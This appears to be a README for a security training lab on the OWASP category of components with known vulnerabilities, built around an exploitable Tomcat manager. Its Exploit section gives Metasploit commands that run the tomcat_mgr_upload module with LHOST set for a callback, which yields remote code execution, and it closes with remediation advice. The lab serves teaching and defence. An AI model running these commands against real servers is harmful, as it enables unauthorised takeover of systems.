### Description

Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.

refers : https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities


### Setting env

```console

$ bash run.sh

```
### Issue 

Tomcat is vulnerable for manager authenticated upload code execution

### Exploit 

```console

$ msfconsole -r exploit.rc

msf5 exploit(multi/http/tomcat_mgr_upload) >  set LHOST 192.168.255.1 # Public ip

msf5 exploit(multi/http/tomcat_mgr_upload) >  run

```

refers : https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload

### Fix 

Don't use default passwords and Upgrade tomcat with new version
